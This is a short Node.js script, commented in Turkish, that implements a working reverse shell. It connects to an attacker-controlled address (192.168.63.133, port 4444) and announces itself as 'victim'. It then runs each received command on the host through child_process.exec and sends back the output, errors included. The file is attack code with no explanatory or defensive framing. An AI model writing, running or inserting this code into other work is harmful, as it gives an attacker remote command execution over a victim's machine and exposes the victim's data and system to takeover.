(function() {
    const host = "192.168.63.133"; // Saldırganın IP adresi
    const port = 4444; // Saldırganın dinlediği port
    const net = require('net'); // Node.js'de TCP bağlantısı için
    const cp = require('child_process'); // Komut çalıştırmak için

    const client = new net.Socket();
    client.connect(port, host, () => {
        client.write("Connected to victim\n");
    });

    client.on('data', (data) => {
        const command = data.toString().trim();
        if (command === "exit") {
            client.end();
        } else {
            cp.exec(command, (err, stdout, stderr) => {
                if (stdout) client.write(stdout);
                if (stderr) client.write(stderr);
                if (err) client.write(err.message);
            });
        }
    });

    client.on('close', () => {
        process.exit(0);
    });
})();
